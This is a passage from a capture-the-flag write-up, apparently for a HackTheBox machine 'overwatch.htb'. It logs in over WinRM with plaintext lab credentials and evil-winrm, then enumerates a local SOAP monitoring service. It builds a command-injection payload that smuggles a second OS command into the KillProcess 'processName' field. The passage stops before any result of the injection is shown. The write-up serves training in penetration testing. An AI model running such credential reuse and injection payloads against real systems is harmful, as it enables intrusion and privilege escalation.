+<img src="/assets/img/ctf/data/overwatch-bloodhound.png" alt="overwatch-bloodhound" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ USER</span><span class="o">=</span>sqlmgmt <span class="p">;</span> <span class="nv">PASS</span><span class="o">=</span>bIhBbzMMnB82yx
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc winrm <span class="nv">$IP</span> <span class="nt">-u</span> <span class="nv">$USER</span> <span class="nt">-p</span> <span class="nv">$PASS</span>
+WINRM       10.129.50.147   5985   S200401          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:S200401<span class="o">)</span> <span class="o">(</span>domain:overwatch.htb<span class="o">)</span>
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms <span class="k">in </span>48.0.0.
+  arc4 <span class="o">=</span> algorithms.ARC4<span class="o">(</span>self._key<span class="o">)</span>
+WINRM       10.129.50.147   5985   S200401          <span class="o">[</span>+] overwatch.htb<span class="se">\s</span>qlmgmt:bIhBbzMMnB82yx <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Here we go! We can authenticate over <code class="language-plaintext highlighter-rouge">winrm</code>!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> <span class="nv">$IP</span> <span class="nt">-u</span> <span class="nv">$USER</span> <span class="nt">-p</span> <span class="nv">$PASS</span>
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Evil-WinRM</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">v3.9</span><span class="w">
+
+</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
+
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">~/Desktop/user.txt</span><span class="w">
+</span><span class="err">&lt;</span><span class="n">REDACTED</span><span class="err">&gt;</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">
+
+</span><span class="n">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------</span><span class="w">
+
+</span><span class="n">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">         </span><span class="nx">SID</span><span class="w">
+</span><span class="o">=================</span><span class="w"> </span><span class="o">=============================================</span><span class="w">
+</span><span class="n">overwatch\sqlmgmt</span><span class="w"> </span><span class="nx">S-1-5-21-2797066498-1365161904-233915892-1105</span><span class="w">
+
+
+</span><span class="n">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">-----------------</span><span class="w">
+
+</span><span class="n">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                  </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">          </span><span class="nx">Attributes</span><span class="w">
+</span><span class="o">===========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
+</span><span class="n">Everyone</span><span class="w">                                    </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">             </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Users</span><span class="w">                               </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">BUILTIN\Pre-Windows</span><span class="w"> </span><span class="nx">2000</span><span class="w"> </span><span class="nx">Compatible</span><span class="w"> </span><span class="nx">Access</span><span class="w">  </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-554</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                        </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">            </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">              </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">            </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">  </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
+</span><span class="n">Mandatory</span><span class="w"> </span><span class="nx">Label\Medium</span><span class="w"> </span><span class="nx">Plus</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w"> </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-8448</span><span class="w">
+
+
+</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------------</span><span class="w">
+
+</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
+</span><span class="n">SeMachineAccountPrivilege</span><span class="w">     </span><span class="nx">Add</span><span class="w"> </span><span class="nx">workstations</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w">     </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
+</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">
+
+</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<hr />
+
+<h2 id="-3-privilege-escalation-sqlmgmt---administrator">📈 3. Privilege Escalation (<code class="language-plaintext highlighter-rouge">sqlmgmt</code> -&gt; <code class="language-plaintext highlighter-rouge">Administrator</code>)</h2>
+
+<p>Now let’s dive into the application <code class="language-plaintext highlighter-rouge">overwatch.exe</code> running locally on port <code class="language-plaintext highlighter-rouge">8000</code>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Software\Monitoring</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-usebasicparsing</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="s2">"http://localhost:8000/MonitorService"</span><span class="w">
+
+
+</span><span class="n">StatusCode</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">200</span><span class="w">
+</span><span class="n">StatusDescription</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">OK</span><span class="w">
+</span><span class="n">Content</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">HTML</span><span class="w"> </span><span class="nx">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="err">&gt;&lt;</span><span class="n">HEAD</span><span class="err">&gt;&lt;</span><span class="nx">link</span><span class="w"> </span><span class="nx">rel</span><span class="o">=</span><span class="s2">"alternate"</span><span class="w"> </span><span class="kr">type</span><span class="o">=</span><span class="s2">"text/xml"</span><span class="w"> </span><span class="n">href</span><span class="o">=</span><span class="s2">"http://overwatch.htb:8000/MonitorService?disco"</span><span class="n">/</span><span class="err">&gt;&lt;</span><span class="nx">STYLE</span><span class="w"> </span><span class="nx">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="err">&gt;</span><span class="c">#content{ FONT-SIZE: 0.7em; PADDING-BOTTOM: 2em; MARGIN-LEFT: ...</span><span class="w">
+</span><span class="n">RawContent</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">HTTP/1.1</span><span class="w"> </span><span class="nx">200</span><span class="w"> </span><span class="nx">OK</span><span class="w">
+                    </span><span class="n">Content-Length:</span><span class="w"> </span><span class="nx">3077</span><span class="w">
+                    </span><span class="n">Content-Type:</span><span class="w"> </span><span class="nx">text/html</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="n">UTF-8</span><span class="w">
+                    </span><span class="nx">Date:</span><span class="w"> </span><span class="nx">Fri</span><span class="p">,</span><span class="w"> </span><span class="nx">08</span><span class="w"> </span><span class="nx">May</span><span class="w"> </span><span class="nx">2026</span><span class="w"> </span><span class="nx">23:01:14</span><span class="w"> </span><span class="nx">GMT</span><span class="w">
+                    </span><span class="n">Server:</span><span class="w"> </span><span class="nx">Microsoft-HTTPAPI/2.0</span><span class="w">
+
+                    </span><span class="err">&lt;</span><span class="n">HTML</span><span class="w"> </span><span class="nx">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="err">&gt;&lt;</span><span class="n">HEAD</span><span class="err">&gt;&lt;</span><span class="nx">link</span><span class="w"> </span><span class="nx">rel</span><span class="o">=</span><span class="s2">"alternate"</span><span class="w"> </span><span class="kr">type</span><span class="o">=</span><span class="s2">"t...
+Forms             :
+Headers           : {[Content-Length, 3077], [Content-Type, text/html; charset=UTF-8], [Date, Fri, 08 May 2026 23:01:14 GMT], [Server, Microsoft-HTTPAPI/2.0]}
+Images            : {}
+InputFields       : {}
+Links             : {@{outerHTML=&lt;A HREF="</span><span class="n">http://overwatch.htb:8000/MonitorService</span><span class="nf">?</span><span class="nx">wsdl</span><span class="s2">"&gt;http://overwatch.htb:8000/MonitorService?wsdl&lt;/A&gt;; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?wsdl}, @{outerHTML=&lt;A
+                    HREF="</span><span class="nx">http://overwatch.htb:8000/MonitorService</span><span class="nf">?</span><span class="nx">singleWsdl</span><span class="s2">"&gt;http://overwatch.htb:8000/MonitorService?singleWsdl&lt;/A&gt;; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?singleWsdl}}
+ParsedHtml        :
+RawContentLength  : 3077
+</span></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Software\Monitoring</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$wsdl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iwr</span><span class="w"> </span><span class="nt">-usebasicparsing</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="s2">"http://localhost:8000/MonitorService?wsdl"</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">([</span><span class="n">xml</span><span class="p">]</span><span class="nv">$wsdl</span><span class="o">.</span><span class="nf">Content</span><span class="p">)</span><span class="o">.</span><span class="nf">definitions</span><span class="o">.</span><span class="nf">portType</span><span class="o">.</span><span class="nf">operation</span><span class="o">.</span><span class="nf">name</span><span class="w">
+</span><span class="n">StartMonitoring</span><span class="w">
+</span><span class="nx">StopMonitoring</span><span class="w">
+</span><span class="n">KillProcess</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The function <code class="language-plaintext highlighter-rouge">KillProcess</code> is very interesting. It likely is running as <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>. Thus if we know which parameters it has and how to exploit them, we might escalate our privileges locally on the DC.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Software\Monitoring</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-usebasicparsing</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="s2">"http://overwatch.htb:8000/MonitorService?xsd=xsd0"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Content</span><span class="w">
+</span><span class="err">&lt;</span><span class="nf">?</span><span class="nx">xml</span><span class="w"> </span><span class="nx">version</span><span class="o">=</span><span class="s2">"1.0"</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="nf">?</span><span class="err">&gt;&lt;</span><span class="nx">xs:schema</span><span class="w"> </span><span class="nx">elementFormDefault</span><span class="o">=</span><span class="s2">"qualified"</span><span class="w"> </span><span class="n">targetNamespace</span><span class="o">=</span><span class="s2">"http://tempuri.org/"</span><span class="w"> </span><span class="n">xmlns:xs</span><span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema"</span><span class="w"> </span><span class="n">xmlns:tns</span><span class="o">=</span><span class="s2">"http://tempuri.org/"</span><span class="err">&gt;&lt;</span><span class="n">xs:element</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"StartMonitoring"</span><span class="err">&gt;&lt;</span><span class="n">xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">xs:sequence/</span><span class="err">&gt;&lt;</span><span class="nx">/xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">/xs:element</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"StartMonitoringResponse"</span><span class="err">&gt;&lt;</span><span class="n">xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">minOccurs</span><span class="o">=</span><span class="s2">"0"</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">"StartMonitoringResult"</span><span class="w"> </span><span class="n">nillable</span><span class="o">=</span><span class="s2">"true"</span><span class="w"> </span><span class="kr">type</span><span class="o">=</span><span class="s2">"xs:string"</span><span class="n">/</span><span class="err">&gt;&lt;</span><span class="nx">/xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">/xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">/xs:element</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"StopMonitoring"</span><span class="err">&gt;&lt;</span><span class="n">xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">xs:sequence/</span><span class="err">&gt;&lt;</span><span class="nx">/xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">/xs:element</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"StopMonitoringResponse"</span><span class="err">&gt;&lt;</span><span class="n">xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">minOccurs</span><span class="o">=</span><span class="s2">"0"</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">"StopMonitoringResult"</span><span class="w"> </span><span class="n">nillable</span><span class="o">=</span><span class="s2">"true"</span><span class="w"> </span><span class="kr">type</span><span class="o">=</span><span class="s2">"xs:string"</span><span class="n">/</span><span class="err">&gt;&lt;</span><span class="nx">/xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">/xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">/xs:element</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"KillProcess"</span><span class="err">&gt;&lt;</span><span class="n">xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">minOccurs</span><span class="o">=</span><span class="s2">"0"</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">"processName"</span><span class="w"> </span><span class="n">nillable</span><span class="o">=</span><span class="s2">"true"</span><span class="w"> </span><span class="kr">type</span><span class="o">=</span><span class="s2">"xs:string"</span><span class="n">/</span><span class="err">&gt;&lt;</span><span class="nx">/xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">/xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">/xs:element</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"KillProcessResponse"</span><span class="err">&gt;&lt;</span><span class="n">xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">xs:element</span><span class="w"> </span><span class="nx">minOccurs</span><span class="o">=</span><span class="s2">"0"</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s2">"KillProcessResult"</span><span class="w"> </span><span class="n">nillable</span><span class="o">=</span><span class="s2">"true"</span><span class="w"> </span><span class="kr">type</span><span class="o">=</span><span class="s2">"xs:string"</span><span class="n">/</span><span class="err">&gt;&lt;</span><span class="nx">/xs:sequence</span><span class="err">&gt;&lt;</span><span class="nx">/xs:complexType</span><span class="err">&gt;&lt;</span><span class="nx">/xs:element</span><span class="err">&gt;&lt;</span><span class="nx">/xs:schema</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<p>There it is! That function has only one parameter which is:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"KillProcess"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;xs:complexType&gt;</span>
+    <span class="nt">&lt;xs:sequence&gt;</span>
+      <span class="nt">&lt;xs:element</span> <span class="na">minOccurs=</span><span class="s">"0"</span> <span class="na">name=</span><span class="s">"processName"</span> <span class="na">nillable=</span><span class="s">"true"</span> <span class="na">type=</span><span class="s">"xs:string"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/xs:sequence&gt;</span>
+  <span class="nt">&lt;/xs:complexType&gt;</span>
+<span class="nt">&lt;/xs:element&gt;</span>
+</code></pre></div></div>
+
+<p>Let’s check out who’s owning that process:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Software\Monitoring</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$port8000</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">8000</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nv">$targetPid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$port8000</span><span class="o">.</span><span class="nf">trim</span><span class="p">()</span><span class="o">.</span><span class="nf">split</span><span class="p">(</span><span class="s2">" "</span><span class="p">,[</span><span class="n">System.StringSplitOptions</span><span class="p">]::</span><span class="nx">RemoveEmptyEntries</span><span class="p">)[</span><span class="nt">-1</span><span class="p">]</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nx">tasklist</span><span class="w"> </span><span class="nx">/V</span><span class="w"> </span><span class="nx">/FI</span><span class="w"> </span><span class="s2">"PID eq </span><span class="nv">$targetPid</span><span class="s2">"</span><span class="w">
+</span><span class="n">tasklist.exe</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">ERROR:</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">denied</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="n">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">NotSpecified:</span><span class="w"> </span><span class="p">(</span><span class="n">ERROR:</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">denied:String</span><span class="p">)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="nx">RemoteException</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="n">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NativeCommandError</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Although it seems like an error, it’s actually a good sign - we don’t have enough permissions to see who owns that process which means it’s owned by someone who is higher privileged than us - likely the Administrator!</p>
+
+<p>Let’s try to inject some OS commands!</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://localhost:8000/MonitorService"</span><span class="w">
+</span><span class="nv">$action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://tempuri.org/IMonitoringService/KillProcess"</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"notepad.exe; whoami &gt; C:\Users\sqlmgmt\pwned.txt"</span><span class="w">
+</span><span class="nv">$soap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
+&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/"&gt;
+   &lt;soapenv:Header/&gt;
+   &lt;soapenv:Body&gt;
+      &lt;tem:KillProcess&gt;
+         &lt;tem:processName&gt;</span><span class="nv">$payload</span><span class="sh">&lt;/tem:processName&gt;
+      &lt;/tem:KillProcess&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+"@</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="nx">~</span><span class="w">
+
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\sqlmgmt</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                 </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                 </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">         </span><span class="nx">5/16/2025</span><span class="w">   </span><span class="nx">8:09</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Desktop</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">         </span><span class="nx">5/16/2025</span><span class="w">   </span><span class="nx">8:08</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Documents</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Downloads</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Favorites</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Links</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Music</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Pictures</span><span class="w">
+</span><span class="n">d-----</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Saved</span><span class="w"> </span><span class="nx">Games</span><span class="w">
+</span><span class="n">d-r---</span><span class="w">          </span><span class="nx">5/8/2021</span><span class="w">   </span><span class="nx">1:20</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Videos</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">5</span><span class="n">/8/2026</span><span class="w">   </span><span class="nx">4:17</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">7680</span><span class="w"> </span><span class="nx">m.exe</span><span class="w">
+</span><span class="nt">-a</span><span class="o">----</span><span class="w">          </span><span class="mi">5</span><span class="n">/8/2026</span><span class="w">   </span><span class="nx">3:50</span><span class="w"> </span><span class="nx">PM</span><span class="w">       </span><span class="nx">11115520</span><span class="w"> </span><span class="nx">w.exe</span><span class="w">
+
+
